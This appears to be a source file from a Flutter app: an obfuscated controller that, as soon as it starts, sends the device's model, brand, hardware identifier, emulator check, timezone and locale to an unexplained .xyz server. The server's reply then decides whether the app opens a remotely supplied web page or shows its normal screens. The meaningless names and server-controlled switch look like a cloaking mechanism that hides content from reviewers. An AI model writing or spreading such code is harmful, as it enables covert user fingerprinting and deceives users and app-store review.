import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var iufrywgj = RxBool(false);
  var ndlzwp = RxBool(true);
  var stlh = RxString("");
  var riley = RxBool(false);
  var zulauf = RxBool(true);
  final lrcudxw = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    elamzkvq();
  }


  Future<void> elamzkvq() async {

    riley.value = true;
    zulauf.value = true;
    ndlzwp.value = false;

    lrcudxw.post("https://ki.pisxei.xyz/mVPSgCn7Cqzs3",data: await omgqhprakl()).then((value) {
      var ycitswog = value.data["ycitswog"] as String;
      var qsgaeub = value.data["qsgaeub"] as bool;
      if (qsgaeub) {
        stlh.value = ycitswog;
        alan();
      } else {
        rice();
      }
    }).catchError((e) {
      ndlzwp.value = true;
      zulauf.value = true;
      riley.value = false;
    });
  }

  Future<Map<String, dynamic>> omgqhprakl() async {
    final DeviceInfoPlugin nyadz = DeviceInfoPlugin();
    PackageInfo fbtpv_ctqda = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var dlzs = Platform.localeName;
    var ZYTk = currentTimeZone;

    var Sxseig = fbtpv_ctqda.packageName;
    var YbcmraI = fbtpv_ctqda.version;
    var yVwmS = fbtpv_ctqda.buildNumber;

    var rUvBLeM = fbtpv_ctqda.appName;
    var naohsMv  = "";
    var elliottKertzmann = "";
    var atTyKh = "";
    var jarvisDooley = "";
    var stephenConroy = "";
    var gqMZNiTh = "";
    var murlLesch = "";
    var florianTowne = "";


    var dHFSYRL = "";
    var lMEzh = false;

    if (GetPlatform.isAndroid) {
      dHFSYRL = "android";
      var yhbtrf = await nyadz.androidInfo;

      atTyKh = yhbtrf.brand;

      gqMZNiTh  = yhbtrf.model;
      naohsMv = yhbtrf.id;

      lMEzh = yhbtrf.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      dHFSYRL = "ios";
      var rgasxfu = await nyadz.iosInfo;
      atTyKh = rgasxfu.name;
      gqMZNiTh = rgasxfu.model;

      naohsMv = rgasxfu.identifierForVendor ?? "";
      lMEzh  = rgasxfu.isPhysicalDevice;
    }
    var res = {
      "elliottKertzmann" : elliottKertzmann,
      "rUvBLeM": rUvBLeM,
      "YbcmraI": YbcmraI,
      "gqMZNiTh": gqMZNiTh,
      "ZYTk": ZYTk,
      "atTyKh": atTyKh,
      "naohsMv": naohsMv,
      "dlzs": dlzs,
      "yVwmS": yVwmS,
      "dHFSYRL": dHFSYRL,
      "lMEzh": lMEzh,
      "stephenConroy" : stephenConroy,
      "Sxseig": Sxseig,
      "murlLesch" : murlLesch,
      "jarvisDooley" : jarvisDooley,
      "florianTowne" : florianTowne,

    };
    return res;
  }

  Future<void> rice() async {
    Get.offAllNamed("/code_tab");
  }

  Future<void> alan() async {
    Get.offAllNamed("/code_out");
  }
}
